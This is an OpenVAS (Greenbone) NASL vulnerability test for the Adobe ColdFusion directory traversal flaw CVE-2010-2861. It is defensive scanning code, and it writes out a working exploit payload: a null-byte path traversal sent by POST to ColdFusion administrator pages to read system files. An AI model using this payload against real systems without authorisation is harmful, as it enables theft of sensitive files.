###############################################################################
# OpenVAS Vulnerability Test
#
# Adobe ColdFusion CVE-2010-2861 Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:adobe:coldfusion";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100772");
  script_version("2022-08-09T10:11:17+0000");
  script_tag(name:"last_modification", value:"2022-08-09 10:11:17 +0000 (Tue, 09 Aug 2022)");
  script_tag(name:"creation_date", value:"2010-09-02 16:10:00 +0200 (Thu, 02 Sep 2010)");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2010-2861");

  script_name("Adobe ColdFusion Directory Traversal Vulnerability (APSB10-18)");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/42342");
  script_xref(name:"URL", value:"http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/");
  script_xref(name:"URL", value:"http://www.adobe.com/support/security/bulletins/apsb10-18.html");

  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_coldfusion_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("adobe/coldfusion/http/detected");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"summary", value:"Adobe ColdFusion is prone to a directory-traversal vulnerability
  because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting this issue may allow an attacker to obtain sensitive
  information that could aid in further attacks.");

  script_tag(name:"affected", value:"Adobe ColdFusion 9.0.1 and prior are vulnerable.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

files = traversal_files();

urls[i++] = "/CFIDE/administrator/enter.cfm";
urls[i++] = "/CFIDE/wizards/common/_logintowizard.cfm";
urls[i++] = "/CFIDE/administrator/archives/index.cfm";
urls[i++] = "/CFIDE/administrator/entman/index.cfm";

host = http_host_name(port:port);

foreach url(urls) {
  foreach pattern(keys(files)) {

    file = files[pattern];
    postdata = string("locale=%00../../../../../../../../../../../", file, "%00a");

    req = string(
             "POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postdata), "\r\n",
             "\r\n",
             postdata );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if(egrep(pattern:pattern, string:res, icase:TRUE)) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
